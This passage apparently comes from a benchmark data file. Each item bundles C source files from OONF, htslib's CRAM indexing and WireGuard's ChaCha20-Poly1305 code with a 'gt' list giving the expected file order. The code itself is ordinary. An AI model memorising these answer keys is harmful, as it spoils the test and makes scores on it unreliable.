            "'lwjson/lwjson/src/include/lwjson/lwjson.h'",
            "'lwjson/examples/example_stream.c'"
        ]
    },
    {
        "files": [
            "'OONF/include/oonf/libconfig/cfg_cmd.h'",
            "'OONF/include/oonf/libconfig/cfg.h'",
            "'OONF/src/generic/cfg_uciloader/cfg_uciloader.c'",
            "'OONF/include/oonf/libconfig/cfg_io.h'"
        ],
        "content": "'OONF/include/oonf/libconfig/cfg_cmd.h'\n:\n\n\n\n\n#ifndef CFG_CMD_H_\n#define CFG_CMD_H_\n\n#include <oonf/libcommon/autobuf.h>\n#include <oonf/oonf.h>\n\n#include <oonf/libconfig/cfg.h>\n#include <oonf/libconfig/cfg_db.h>\n\n\nEXPORT int cfg_cmd_handle_set(struct cfg_instance *instance, struct cfg_db *db, const char *arg, struct autobuf *log);\nEXPORT int cfg_cmd_handle_remove(\n  struct cfg_instance *instance, struct cfg_db *db, const char *arg, struct autobuf *log);\nEXPORT int cfg_cmd_handle_get(struct cfg_instance *instance, struct cfg_db *db, const char *arg, struct autobuf *log);\nEXPORT int cfg_cmd_handle_query(struct cfg_instance *instance, struct cfg_db *db, const char *arg, struct autobuf *log);\nEXPORT int cfg_cmd_handle_load(struct cfg_instance *instance, struct cfg_db *db, const char *arg, struct autobuf *log);\nEXPORT int cfg_cmd_handle_save(struct cfg_instance *instance, struct cfg_db *db, const char *arg, struct autobuf *log);\nEXPORT int cfg_cmd_handle_schema(struct cfg_db *db, const char *arg, struct autobuf *log);\n\n#endif\n\n'OONF/include/oonf/libconfig/cfg.h'\n:\n\n\n\n\n#ifndef CFG_H_\n#define CFG_H_\n\n\nstruct cfg_instance;\n\n#include <ctype.h>\n\n#include <oonf/libcommon/autobuf.h>\n#include <oonf/libcommon/avl.h>\n#include <oonf/oonf.h>\n\n#include <oonf/libconfig/cfg_cmd.h>\n#include <oonf/libconfig/cfg_io.h>\n#include <oonf/libconfig/cfg_schema.h>\n\n\n#define CFG_IO_URL_SPLITTER \":\n\n\nstruct cfg_instance {\n\n  struct avl_tree io_tree;\n\n\n  const char *default_io;\n};\n\nEXPORT void cfg_add(struct cfg_instance *);\nEXPORT void cfg_remove(struct cfg_instance *);\n\nEXPORT int cfg_append_printable_line(struct autobuf *autobuf, const char *fmt, ...)\n  __attribute__((format(printf, 2, 3)));\nEXPORT bool cfg_is_allowed_key(const char *key);\nEXPORT const char *cfg_get_choice_array_value(size_t idx, const void *ptr);\nEXPORT int cfg_get_choice_index(\n  const char *key, const char *(*callback)(size_t idx, const void *ptr), size_t choices_count, const void *ptr);\n\nEXPORT int cfg_avlcmp_keys(const void *p1, const void *p2);\n\nEXPORT void cfg_set_ifname_handler(int (*get_phy_if)(char *phy_ifname, const char *ifname));\nEXPORT const char *cfg_get_phy_if(char *phy_if, const char *ifname);\n\n\nstatic INLINE int\ncfg_cmp_keys(const char *str1, const char *str2) {\n  return cfg_avlcmp_keys(str1, str2);\n}\n\n\nstatic INLINE bool\ncfg_get_bool(const char *value) {\n  return cfg_get_choice_index(value, cfg_get_choice_array_value, ARRAYSIZE(CFGLIST_BOOL_TRUE), CFGLIST_BOOL_TRUE) >= 0;\n}\n\n\nstatic INLINE bool\ncfg_is_bool(const char *value) {\n  return cfg_get_choice_index(value, cfg_get_choice_array_value, ARRAYSIZE(CFGLIST_BOOL), CFGLIST_BOOL) >= 0;\n}\n\n\nstatic INLINE bool\ncfg_is_allowed_section_name(const char *name) {\n  return strchr(name, ' ') == NULL;\n}\n\n#endif\n\n'OONF/src/generic/cfg_uciloader/cfg_uciloader.c'\n:\n\n\n\n\n#include <errno.h>\n#include <fcntl.h>\n#include <string.h>\n#include <sys/stat.h>\n#include <sys/types.h>\n#include <unistd.h>\n\n#include <uci.h>\n#undef container_of\n\n#include <oonf/libcommon/autobuf.h>\n#include <oonf/oonf.h>\n#include <oonf/libconfig/cfg.h>\n#include <oonf/libconfig/cfg_io.h>\n#include <oonf/libcore/oonf_subsystem.h>\n\n#include <oonf/libcore/oonf_cfg.h>\n\n#include <oonf/generic/cfg_uciloader/cfg_uciloader.h>\n\nstatic void _early_cfg_init(void);\nstatic void _cleanup(void);\n\nstatic struct cfg_db *_cb_uci_load(const char *param, struct autobuf *log);\nstatic int _load_section(\n  struct uci_section *sec, struct cfg_db *db, const char *type, const char *name, struct autobuf *log);\n\nstatic int _get_phy_ifname(char *phy_ifname, const char *ifname);\n\nstatic struct oonf_subsystem _oonf_cfg_uciloader_subsystem = {\n  .name = OONF_CFG_UCILOADER_SUBSYSTEM,\n  .descr = \"OONF uci handler for configuration system\",\n  .author = \"Henning Rogge\",\n\n  .cleanup = _cleanup,\n  .early_cfg_init = _early_cfg_init,\n\n  .no_logging = true,\n};\nDECLARE_OONF_PLUGIN(_oonf_cfg_uciloader_subsystem);\n\nstatic struct cfg_io _cfg_io_uci = {\n  .name = \"uci\",\n  .load = _cb_uci_load,\n  .def = false,\n};\n\n\nstatic void\n_early_cfg_init(void) {\n  cfg_io_add(oonf_cfg_get_instance(), &_cfg_io_uci);\n  cfg_set_ifname_handler(_get_phy_ifname);\n}\n\n\nstatic void\n_cleanup(void) {\n  cfg_io_remove(oonf_cfg_get_instance(), &_cfg_io_uci);\n  cfg_set_ifname_handler(NULL);\n}\n\n\n\n\nstatic struct cfg_db *\n_cb_uci_load(const char *param, struct autobuf *log) {\n  struct uci_context *ctx = NULL;\n  struct uci_package *p = NULL;\n  struct uci_element *s, *i;\n\n  struct cfg_db *db = NULL;\n\n  char *err = NULL;\n\n  ctx = uci_alloc_context();\n  if (!ctx) {\n    cfg_append_printable_line(log, \"Could not allocate uci context\");\n    return NULL;\n  }\n\n  if (uci_load(ctx, param, &p)) {\n    goto uci_error;\n  }\n\n  db = cfg_db_add();\n  if (!db) {\n    goto loading_error;\n  }\n\n  uci_foreach_element(&p->sections, s) {\n    struct uci_section *sec = uci_to_section(s);\n    struct uci_option *names;\n\n    names = uci_lookup_option(ctx, sec, UCI_OPTION_FOR_SECTION_NAME);\n    if (!names) {\n\n      if (_load_section(sec, db, sec->type, NULL, log)) {\n        goto loading_error;\n      }\n    }\n    else {\n      switch (names->type) {\n        case UCI_TYPE_STRING:\n\n          if (_load_section(sec, db, sec->type, names->v.string, log)) {\n            goto loading_error;\n          }\n          break;\n        case UCI_TYPE_LIST:\n\n          uci_foreach_element(&names->v.list, i) {\n            if (_load_section(sec, db, sec->type, i->name, log)) {\n              goto loading_error;\n            }\n          }\n          break;\n        default:\n          cfg_append_printable_line(log, \"# uci-error: unknown type for option '%s'\\n\", names->e.name);\n          goto loading_error;\n      }\n    }\n  }\n\n  uci_free_context(ctx);\n  return db;\n\nuci_error:\n  uci_get_errorstr(ctx, &err, NULL);\n  abuf_appendf(log, \"%s\\n\", err);\n  free(err);\n\nloading_error:\n  if (db) {\n    cfg_db_remove(db);\n  }\n\n  uci_free_context(ctx);\n  return NULL;\n}\n\nstatic int\n_load_section(struct uci_section *sec, struct cfg_db *db, const char *type, const char *name, struct autobuf *log) {\n  struct uci_element *o, *i;\n  struct cfg_named_section *db_section;\n\n  if (name) {\n    db_section = cfg_db_add_namedsection(db, type, name);\n  }\n  else {\n    db_section = cfg_db_add_unnamedsection(db, type);\n  }\n\n  if (!db_section) {\n    cfg_append_printable_line(\n      log, \"Could not allocate configuration section (%s/%s)\", db_section->section_type->type, db_section->name);\n    return -1;\n  }\n\n  uci_foreach_element(&sec->options, o) {\n    struct uci_option *opt = uci_to_option(o);\n    if (strcmp(opt->e.name, UCI_OPTION_FOR_SECTION_NAME) == 0) {\n      continue;\n    }\n\n    switch (opt->type) {\n      case UCI_TYPE_STRING:\n        if (!cfg_db_add_entry(db, db_section->section_type->type, db_section->name, opt->e.name, opt->v.string)) {\n          cfg_append_printable_line(log, \"Could not allocate configuration entry (%s/%s/%s)='%s'\",\n            db_section->section_type->type, db_section->name, opt->e.name, opt->v.string);\n          return -1;\n        };\n        break;\n      case UCI_TYPE_LIST:\n        uci_foreach_element(&opt->v.list, i) {\n          if (!cfg_db_add_entry(db, db_section->section_type->type, db_section->name, opt->e.name, i->name)) {\n            cfg_append_printable_line(log, \"Could not allocate configuration entry (%s/%s/%s)='%s'\",\n              db_section->section_type->type, db_section->name, opt->e.name, i->name);\n            return -1;\n          };\n        }\n        break;\n      default:\n        cfg_append_printable_line(log, \"# uci-error: unknown type for option '%s'\\n\", opt->e.name);\n        return -1;\n    }\n  }\n  return 0;\n}\n\n\nstatic int\n_get_phy_ifname(char *phy_ifname, const char *ifname) {\n  struct uci_context *ctx = NULL;\n  struct uci_package *p = NULL;\n  struct uci_section *sec;\n  struct uci_option *opt;\n\n  int result = 0;\n\n  ctx = uci_alloc_context();\n  if (!ctx) {\n    return -1;\n  }\n\n  if (uci_load(ctx, \"/etc/config/network\", &p)) {\n    result = -2;\n    goto uci_error;\n  }\n\n  sec = uci_lookup_section(ctx, p, ifname);\n  if (!sec) {\n\n    result = -3;\n    goto uci_error;\n  }\n\n  if (!sec->type || strcmp(sec->type, \"interface\") != 0) {\n    result = -4;\n    goto uci_error;\n  }\n\n  opt = uci_lookup_option(ctx, sec, \"ifname\");\n  if (!opt) {\n    result = -5;\n    goto uci_error;\n  }\n\n  strscpy(phy_ifname, opt->v.string, IF_NAMESIZE);\n\nuci_error:\n  uci_free_context(ctx);\n  return result;\n}\n\n'OONF/include/oonf/libconfig/cfg_io.h'\n:\n\n\n\n\n#ifndef CFG_IO_H_\n#define CFG_IO_H_\n\n\nstruct cfg_io;\n\n#include <oonf/libcommon/autobuf.h>\n#include <oonf/libcommon/avl.h>\n#include <oonf/oonf.h>\n\n#include <oonf/libconfig/cfg.h>\n\n\nstruct cfg_io {\n\n  struct avl_node node;\n\n\n  const char *name;\n\n\n  bool def;\n\n\n  struct cfg_db *(*load)(const char *param, struct autobuf *log);\n\n\n  int (*save)(const char *param, struct cfg_db *src, struct autobuf *log);\n};\n\n\n#define CFG_FOR_ALL_IO(instance, io, safeit) avl_for_each_element_safe(&(instance)->io_tree, io, node, safeit)\n\nEXPORT void cfg_io_add(struct cfg_instance *, struct cfg_io *);\nEXPORT void cfg_io_remove(struct cfg_instance *, struct cfg_io *);\n\nEXPORT struct cfg_db *cfg_io_load(struct cfg_instance *instance, const char *url, struct autobuf *log);\nEXPORT int cfg_io_save(struct cfg_instance *instance, const char *url, struct cfg_db *src, struct autobuf *log);\n\n#endif\n",
        "gt": [
            "'OONF/include/oonf/libconfig/cfg_cmd.h'",
            "'OONF/include/oonf/libconfig/cfg.h'",
            "'OONF/include/oonf/libconfig/cfg_io.h'",
            "'OONF/src/generic/cfg_uciloader/cfg_uciloader.c'"
        ]
    },
    {
        "files": [
            "'pblat/htslib/cram/cram.h'",
            "'pblat/htslib/cram/cram_stats.h'",
            "'pblat/htslib/cram/cram_index.c'"
        ],
        "content": "'pblat/htslib/cram/cram.h'\n:\n\n\n\n#ifndef _CRAM_H_\n#define _CRAM_H_\n\n#include \"cram/cram_samtools.h\"\n#include \"cram/sam_header.h\"\n#include \"cram_structs.h\"\n#include \"cram_io.h\"\n#include \"cram_encode.h\"\n#include \"cram_decode.h\"\n#include \"cram_stats.h\"\n#include \"cram_codecs.h\"\n#include \"cram_index.h\"\n\n\n\n\n\n#include \"htslib/cram.h\"\n\n#endif\n\n'pblat/htslib/cram/cram_stats.h'\n:\n\n#ifndef _CRAM_STATS_H_\n#define _CRAM_STATS_H_\n\n#ifdef __cplusplus\nextern \"C\" {\n#endif\n\ncram_stats *cram_stats_create(void);\nvoid cram_stats_add(cram_stats *st, int32_t val);\nvoid cram_stats_del(cram_stats *st, int32_t val);\nvoid cram_stats_dump(cram_stats *st);\nvoid cram_stats_free(cram_stats *st);\n\n\nenum cram_encoding cram_stats_encoding(cram_fd *fd, cram_stats *st);\n\n#ifdef __cplusplus\n}\n#endif\n\n#endif\n\n'pblat/htslib/cram/cram_index.c'\n:\n\n\n\n#include <config.h>\n\n#include <stdio.h>\n#include <errno.h>\n#include <assert.h>\n#include <stdlib.h>\n#include <string.h>\n#include <zlib.h>\n#include <sys/types.h>\n#include <sys/stat.h>\n#include <math.h>\n#include <ctype.h>\n\n#include \"htslib/hfile.h\"\n#include \"hts_internal.h\"\n#include \"cram/cram.h\"\n#include \"cram/os.h\"\n#include \"cram/zfio.h\"\n\n#if 0\nstatic void dump_index_(cram_index *e, int level) {\n    int i, n;\n    n = printf(\"%*s%d / %d .. %d, \", level*4, \"\", e->refid, e->start, e->end);\n    printf(\"%*soffset %\"PRId64\"\\n\", MAX(0,50-n), \"\", e->offset);\n    for (i = 0; i < e->nslice; i++) {\n\tdump_index_(&e->e[i], level+1);\n    }\n}\n\nstatic void dump_index(cram_fd *fd) {\n    int i;\n    for (i = 0; i < fd->index_sz; i++) {\n\tdump_index_(&fd->index[i], 0);\n    }\n}\n#endif\n\nstatic int kget_int32(kstring_t *k, size_t *pos, int32_t *val_p) {\n    int sign = 1;\n    int32_t val = 0;\n    size_t p = *pos;\n\n    while (p < k->l && (k->s[p] == ' ' || k->s[p] == '\\t'))\n\t   p++;\n\n    if (p < k->l && k->s[p] == '-')\n\tsign = -1, p++;\n\n    if (p >= k->l || !(k->s[p] >= '0' && k->s[p] <= '9'))\n\treturn -1;\n\n    while (p < k->l && k->s[p] >= '0' && k->s[p] <= '9')\n\tval = val*10 + k->s[p++]-'0';\n\n    *pos = p;\n    *val_p = sign*val;\n\n    return 0;\n}\n\nstatic int kget_int64(kstring_t *k, size_t *pos, int64_t *val_p) {\n    int sign = 1;\n    int64_t val = 0;\n    size_t p = *pos;\n\n    while (p < k->l && (k->s[p] == ' ' || k->s[p] == '\\t'))\n\t   p++;\n\n    if (p < k->l && k->s[p] == '-')\n\tsign = -1, p++;\n\n    if (p >= k->l || !(k->s[p] >= '0' && k->s[p] <= '9'))\n\treturn -1;\n\n    while (p < k->l && k->s[p] >= '0' && k->s[p] <= '9')\n\tval = val*10 + k->s[p++]-'0';\n\n    *pos = p;\n    *val_p = sign*val;\n\n    return 0;\n}\n\n\nint cram_index_load(cram_fd *fd, const char *fn, const char *fn_idx) {\n    char *fn2 = NULL;\n    char buf[65536];\n    ssize_t len;\n    kstring_t kstr = {0};\n    hFILE *fp;\n    cram_index *idx;\n    cram_index **idx_stack = NULL, *ep, e;\n    int idx_stack_alloc = 0, idx_stack_ptr = 0;\n    size_t pos = 0;\n\n\n    if (fd->index)\n\treturn 0;\n\n    fd->index = calloc((fd->index_sz = 1), sizeof(*fd->index));\n    if (!fd->index)\n\treturn -1;\n\n    idx = &fd->index[0];\n    idx->refid = -1;\n    idx->start = INT_MIN;\n    idx->end   = INT_MAX;\n\n    idx_stack = calloc(++idx_stack_alloc, sizeof(*idx_stack));\n    idx_stack[idx_stack_ptr] = idx;\n\n    if (!fn_idx) {\n\tfn2 = hts_idx_getfn(fn, \".crai\");\n\tif (!fn2) {\n\t    free(idx_stack);\n\t    return -1;\n\t}\n\tfn_idx = fn2;\n    }\n\n    if (!(fp = hopen(fn_idx, \"r\"))) {\n\tperror(fn_idx);\n\tfree(idx_stack);\n\tfree(fn2);\n\treturn -1;\n    }\n\n\n\n    while ((len = hread(fp, buf, 65536)) > 0)\n\tkputsn(buf, len, &kstr);\n    if (len < 0 || kstr.l < 2) {\n\tif (kstr.s)\n\t    free(kstr.s);\n\tfree(idx_stack);\n\tfree(fn2);\n\treturn -1;\n    }\n\n    if (hclose(fp)) {\n\tif (kstr.s)\n\t    free(kstr.s);\n\tfree(idx_stack);\n\tfree(fn2);\n\treturn -1;\n    }\n\n\n\n    if (kstr.s[0] == 31 && (uc)kstr.s[1] == 139) {\n\tsize_t l;\n\tchar *s = zlib_mem_inflate(kstr.s, kstr.l, &l);\n\tfree(kstr.s);\n\tif (!s) {\n\t    free(idx_stack);\n\t    free(fn2);\n\t    return -1;\n\t}\n\tkstr.s = s;\n\tkstr.l = l;\n\tkstr.m = l;\n\tkputsn(\"\", 0, &kstr);\n    }\n\n\n\n    do {\n\n\tif (kget_int32(&kstr, &pos, &e.refid) == -1) {\n\t    free(kstr.s); free(idx_stack); free(fn2); return -1;\n\t}\n\tif (kget_int32(&kstr, &pos, &e.start) == -1) {\n\t    free(kstr.s); free(idx_stack); free(fn2); return -1;\n\t}\n\tif (kget_int32(&kstr, &pos, &e.end) == -1) {\n\t    free(kstr.s); free(idx_stack); free(fn2); return -1;\n\t}\n\tif (kget_int64(&kstr, &pos, &e.offset) == -1) {\n\t    free(kstr.s); free(idx_stack); free(fn2); return -1;\n\t}\n\tif (kget_int32(&kstr, &pos, &e.slice) == -1) {\n\t    free(kstr.s); free(idx_stack); free(fn2); return -1;\n\t}\n\tif (kget_int32(&kstr, &pos, &e.len) == -1) {\n\t    free(kstr.s); free(idx_stack); free(fn2); return -1;\n\t}\n\n\te.end += e.start-1;\n\n\n\tif (e.refid < -1) {\n\t    free(kstr.s);\n\t    free(idx_stack);\n\t    free(fn2);\n\t    fprintf(stderr, \"Malformed index file, refid %d\\n\", e.refid);\n\t    return -1;\n\t}\n\n\tif (e.refid != idx->refid) {\n\t    if (fd->index_sz < e.refid+2) {\n\t\tsize_t index_end = fd->index_sz * sizeof(*fd->index);\n\t\tfd->index_sz = e.refid+2;\n\t\tfd->index = realloc(fd->index,\n\t\t\t\t    fd->index_sz * sizeof(*fd->index));\n\t\tmemset(((char *)fd->index) + index_end, 0,\n\t\t       fd->index_sz * sizeof(*fd->index) - index_end);\n\t    }\n\t    idx = &fd->index[e.refid+1];\n\t    idx->refid = e.refid;\n\t    idx->start = INT_MIN;\n\t    idx->end   = INT_MAX;\n\t    idx->nslice = idx->nalloc = 0;\n\t    idx->e = NULL;\n\t    idx_stack[(idx_stack_ptr = 0)] = idx;\n\t}\n\n\twhile (!(e.start >= idx->start && e.end <= idx->end)) {\n\t    idx = idx_stack[--idx_stack_ptr];\n\t}\n\n\n\tif (idx->nslice+1 >= idx->nalloc) {\n\t    idx->nalloc = idx->nalloc ? idx->nalloc*2 : 16;\n\t    idx->e = realloc(idx->e, idx->nalloc * sizeof(*idx->e));\n\t}\n\n\te.nalloc = e.nslice = 0; e.e = NULL;\n\t*(ep = &idx->e[idx->nslice++]) = e;\n\tidx = ep;\n\n\tif (++idx_stack_ptr >= idx_stack_alloc) {\n\t    idx_stack_alloc *= 2;\n\t    idx_stack = realloc(idx_stack, idx_stack_alloc*sizeof(*idx_stack));\n\t}\n\tidx_stack[idx_stack_ptr] = idx;\n\n\twhile (pos < kstr.l && kstr.s[pos] != '\\n')\n\t    pos++;\n\tpos++;\n    } while (pos < kstr.l);\n\n    free(idx_stack);\n    free(kstr.s);\n    free(fn2);\n\n\n\n    return 0;\n}\n\nstatic void cram_index_free_recurse(cram_index *e) {\n    if (e->e) {\n\tint i;\n\tfor (i = 0; i < e->nslice; i++) {\n\t    cram_index_free_recurse(&e->e[i]);\n\t}\n\tfree(e->e);\n    }\n}\n\nvoid cram_index_free(cram_fd *fd) {\n    int i;\n\n    if (!fd->index)\n\treturn;\n\n    for (i = 0; i < fd->index_sz; i++) {\n\tcram_index_free_recurse(&fd->index[i]);\n    }\n    free(fd->index);\n\n    fd->index = NULL;\n}\n\n\ncram_index *cram_index_query(cram_fd *fd, int refid, int pos,\n\t\t\t     cram_index *from) {\n    int i, j, k;\n    cram_index *e;\n\n    if (refid+1 < 0 || refid+1 >= fd->index_sz)\n\treturn NULL;\n\n    if (!from)\n\tfrom = &fd->index[refid+1];\n\n\n    if (!from->e)\n\treturn NULL;\n\n\n\n    i = 0, j = fd->index[refid+1].nslice-1;\n    for (k = j/2; k != i; k = (j-i)/2 + i) {\n\tif (from->e[k].refid > refid) {\n\t    j = k;\n\t    continue;\n\t}\n\n\tif (from->e[k].refid < refid) {\n\t    i = k;\n\t    continue;\n\t}\n\n\tif (from->e[k].start >= pos) {\n\t    j = k;\n\t    continue;\n\t}\n\n\tif (from->e[k].start < pos) {\n\t    i = k;\n\t    continue;\n\t}\n    }\n\n    if (j >= 0 && from->e[j].start < pos && from->e[j].refid == refid)\n\ti = j;\n\n\n    while (i > 0 && from->e[i-1].end >= pos)\n\ti--;\n\n\n    while (i+1 < from->nslice &&\n\t   (from->e[i].refid < refid ||\n\t    from->e[i].end < pos))\n\ti++;\n\n    e = &from->e[i];\n\n    return e;\n}\n\n\n\nint cram_seek_to_refpos(cram_fd *fd, cram_range *r) {\n    cram_index *e;\n\n\n    if ((e = cram_index_query(fd, r->refid, r->start, NULL))) {\n\tif (0 != cram_seek(fd, e->offset, SEEK_SET))\n\t    if (0 != cram_seek(fd, e->offset - fd->first_container, SEEK_CUR))\n\t\treturn -1;\n    } else {\n\n\treturn -2;\n    }\n\n    if (fd->ctr) {\n\tcram_free_container(fd->ctr);\n\tfd->ctr = NULL;\n\tfd->ooc = 0;\n    }\n\n    return 0;\n}\n\n\n\nstatic int cram_index_build_multiref(cram_fd *fd,\n\t\t\t\t     cram_container *c,\n\t\t\t\t     cram_slice *s,\n\t\t\t\t     zfp *fp,\n\t\t\t\t     off_t cpos,\n\t\t\t\t     int32_t landmark,\n\t\t\t\t     int sz) {\n    int i, ref = -2, ref_start = 0, ref_end;\n    char buf[1024];\n\n    if (0 != cram_decode_slice(fd, c, s, fd->header))\n\treturn -1;\n\n    ref_end = INT_MIN;\n    for (i = 0; i < s->hdr->num_records; i++) {\n\tif (s->crecs[i].ref_id == ref) {\n\t    if (ref_end < s->crecs[i].aend)\n\t\tref_end = s->crecs[i].aend;\n\t    continue;\n\t}\n\n\tif (ref != -2) {\n\t    sprintf(buf, \"%d\\t%d\\t%d\\t%\"PRId64\"\\t%d\\t%d\\n\",\n\t\t    ref, ref_start, ref_end - ref_start + 1,\n\t\t    (int64_t)cpos, landmark, sz);\n\t    zfputs(buf, fp);\n\t}\n\n\tref = s->crecs[i].ref_id;\n\tref_start = s->crecs[i].apos;\n\tref_end = INT_MIN;\n    }\n\n    if (ref != -2) {\n\tsprintf(buf, \"%d\\t%d\\t%d\\t%\"PRId64\"\\t%d\\t%d\\n\",\n\t\tref, ref_start, ref_end - ref_start + 1,\n\t\t(int64_t)cpos, landmark, sz);\n\tzfputs(buf, fp);\n    }\n\n    return 0;\n}\n\n\nint cram_index_build(cram_fd *fd, const char *fn_base, const char *fn_idx) {\n    cram_container *c;\n    off_t cpos, spos, hpos;\n    zfp *fp;\n    kstring_t fn_idx_str = {0};\n\n    if (! fn_idx) {\n        kputs(fn_base, &fn_idx_str);\n        kputs(\".crai\", &fn_idx_str);\n        fn_idx = fn_idx_str.s;\n    }\n\n    if (!(fp = zfopen(fn_idx, \"wz\"))) {\n        perror(fn_idx);\n        free(fn_idx_str.s);\n        return -1;\n    }\n\n    free(fn_idx_str.s);\n\n    cpos = htell(fd->fp);\n    while ((c = cram_read_container(fd))) {\n        int j;\n\n        if (fd->err) {\n            perror(\"Cram container read\");\n            return -1;\n        }\n\n        hpos = htell(fd->fp);\n\n        if (!(c->comp_hdr_block = cram_read_block(fd)))\n            return -1;\n        assert(c->comp_hdr_block->content_type == COMPRESSION_HEADER);\n\n        c->comp_hdr = cram_decode_compression_header(fd, c->comp_hdr_block);\n        if (!c->comp_hdr)\n            return -1;\n\n\n        for (j = 0; j < c->num_landmarks; j++) {\n            char buf[1024];\n            cram_slice *s;\n            int sz;\n\n            spos = htell(fd->fp);\n            assert(spos - cpos - c->offset == c->landmark[j]);\n\n            if (!(s = cram_read_slice(fd))) {\n\t\tzfclose(fp);\n\t\treturn -1;\n\t    }\n\n            sz = (int)(htell(fd->fp) - spos);\n\n\t    if (s->hdr->ref_seq_id == -2) {\n\t\tcram_index_build_multiref(fd, c, s, fp,\n\t\t\t\t\t  cpos, c->landmark[j], sz);\n\t    } else {\n\t\tsprintf(buf, \"%d\\t%d\\t%d\\t%\"PRId64\"\\t%d\\t%d\\n\",\n\t\t\ts->hdr->ref_seq_id, s->hdr->ref_seq_start,\n\t\t\ts->hdr->ref_seq_span, (int64_t)cpos,\n\t\t\tc->landmark[j], sz);\n\t\tzfputs(buf, fp);\n\t    }\n\n            cram_free_slice(s);\n        }\n\n        cpos = htell(fd->fp);\n        assert(cpos == hpos + c->length);\n\n        cram_free_container(c);\n    }\n    if (fd->err) {\n\tzfclose(fp);\n\treturn -1;\n    }\n\n\n    return (zfclose(fp) >= 0)? 0 : -1;\n}\n",
        "gt": [
            "'pblat/htslib/cram/cram_stats.h'",
            "'pblat/htslib/cram/cram.h'",
            "'pblat/htslib/cram/cram_index.c'"
        ]
    },
    {
        "files": [
            "'wireguard-linux-compat/src/compat/neon-arm/include/asm/neon.h'",
            "'wireguard-linux-compat/src/crypto/zinc/chacha20poly1305.c'",
            "'wireguard-linux-compat/src/crypto/include/zinc/chacha20poly1305.h'",
            "'wireguard-linux-compat/src/compat/simd/include/linux/simd.h'"
        ],
        "content": "'wireguard-linux-compat/src/compat/neon-arm/include/asm/neon.h'\n:#ifndef _ARCH_ARM_ASM_NEON\n#define _ARCH_ARM_ASM_NEON\n#define kernel_neon_begin() \\\n\tBUILD_BUG_ON_MSG(1, \"This kernel does not support ARM NEON\")\n#define kernel_neon_end() \\\n\tBUILD_BUG_ON_MSG(1, \"This kernel does not support ARM NEON\")\n#endif\n\n'wireguard-linux-compat/src/crypto/zinc/chacha20poly1305.c'\n:\n\n\n#include <zinc/chacha20poly1305.h>\n#include <zinc/chacha20.h>\n#include <zinc/poly1305.h>\n#include \"selftest/run.h\"\n\n#include <asm/unaligned.h>\n#include <linux/kernel.h>\n#include <linux/module.h>\n#include <linux/init.h>\n#include <crypto/scatterwalk.h>\n\nstatic const u8 pad0[CHACHA20_BLOCK_SIZE] = { 0 };\n\nstatic inline void\n__chacha20poly1305_encrypt(u8 *dst, const u8 *src, const size_t src_len,\n\t\t\t   const u8 *ad, const size_t ad_len, const u64 nonce,\n\t\t\t   const u8 key[CHACHA20POLY1305_KEY_SIZE],\n\t\t\t   simd_context_t *simd_context)\n{\n\tstruct poly1305_ctx poly1305_state;\n\tstruct chacha20_ctx chacha20_state;\n\tunion {\n\t\tu8 block0[POLY1305_KEY_SIZE];\n\t\t__le64 lens[2];\n\t} b = { { 0 } };\n\n\tchacha20_init(&chacha20_state, key, nonce);\n\tchacha20(&chacha20_state, b.block0, b.block0, sizeof(b.block0),\n\t\t simd_context);\n\tpoly1305_init(&poly1305_state, b.block0);\n\n\tpoly1305_update(&poly1305_state, ad, ad_len, simd_context);\n\tpoly1305_update(&poly1305_state, pad0, (0x10 - ad_len) & 0xf,\n\t\t\tsimd_context);\n\n\tchacha20(&chacha20_state, dst, src, src_len, simd_context);\n\n\tpoly1305_update(&poly1305_state, dst, src_len, simd_context);\n\tpoly1305_update(&poly1305_state, pad0, (0x10 - src_len) & 0xf,\n\t\t\tsimd_context);\n\n\tb.lens[0] = cpu_to_le64(ad_len);\n\tb.lens[1] = cpu_to_le64(src_len);\n\tpoly1305_update(&poly1305_state, (u8 *)b.lens, sizeof(b.lens),\n\t\t\tsimd_context);\n\n\tpoly1305_final(&poly1305_state, dst + src_len, simd_context);\n\n\tmemzero_explicit(&chacha20_state, sizeof(chacha20_state));\n\tmemzero_explicit(&b, sizeof(b));\n}\n\nvoid chacha20poly1305_encrypt(u8 *dst, const u8 *src, const size_t src_len,\n\t\t\t      const u8 *ad, const size_t ad_len,\n\t\t\t      const u64 nonce,\n\t\t\t      const u8 key[CHACHA20POLY1305_KEY_SIZE])\n{\n\tsimd_context_t simd_context;\n\n\tsimd_get(&simd_context);\n\t__chacha20poly1305_encrypt(dst, src, src_len, ad, ad_len, nonce, key,\n\t\t\t\t   &simd_context);\n\tsimd_put(&simd_context);\n}\n\nbool chacha20poly1305_encrypt_sg_inplace(struct scatterlist *src,\n\t\t\t\t\t const size_t src_len,\n\t\t\t\t\t const u8 *ad, const size_t ad_len,\n\t\t\t\t\t const u64 nonce,\n\t\t\t\t\t const u8 key[CHACHA20POLY1305_KEY_SIZE],\n\t\t\t\t\t simd_context_t *simd_context)\n{\n\tstruct poly1305_ctx poly1305_state;\n\tstruct chacha20_ctx chacha20_state;\n\tstruct sg_mapping_iter miter;\n\tsize_t partial = 0;\n\tssize_t sl;\n\tunion {\n\t\tu8 chacha20_stream[CHACHA20_BLOCK_SIZE];\n\t\tu8 block0[POLY1305_KEY_SIZE];\n\t\tu8 mac[POLY1305_MAC_SIZE];\n\t\t__le64 lens[2];\n\t} b __aligned(16) = { { 0 } };\n\n\tif (WARN_ON(src_len > INT_MAX))\n\t\treturn false;\n\n\tchacha20_init(&chacha20_state, key, nonce);\n\tchacha20(&chacha20_state, b.block0, b.block0, sizeof(b.block0),\n\t\t simd_context);\n\tpoly1305_init(&poly1305_state, b.block0);\n\n\tpoly1305_update(&poly1305_state, ad, ad_len, simd_context);\n\tpoly1305_update(&poly1305_state, pad0, (0x10 - ad_len) & 0xf,\n\t\t\tsimd_context);\n\n\tsg_miter_start(&miter, src, sg_nents(src), SG_MITER_TO_SG | SG_MITER_ATOMIC);\n\tfor (sl = src_len; sl > 0 && sg_miter_next(&miter); sl -= miter.length) {\n\t\tu8 *addr = miter.addr;\n\t\tsize_t length = min_t(size_t, sl, miter.length);\n\n\t\tif (unlikely(partial)) {\n\t\t\tsize_t l = min(length, CHACHA20_BLOCK_SIZE - partial);\n\n\t\t\tcrypto_xor(addr, b.chacha20_stream + partial, l);\n\t\t\tpartial = (partial + l) & (CHACHA20_BLOCK_SIZE - 1);\n\n\t\t\taddr += l;\n\t\t\tlength -= l;\n\t\t}\n\n\t\tif (likely(length >= CHACHA20_BLOCK_SIZE || length == sl)) {\n\t\t\tsize_t l = length;\n\n\t\t\tif (unlikely(length < sl))\n\t\t\t\tl &= ~(CHACHA20_BLOCK_SIZE - 1);\n\t\t\tchacha20(&chacha20_state, addr, addr, l, 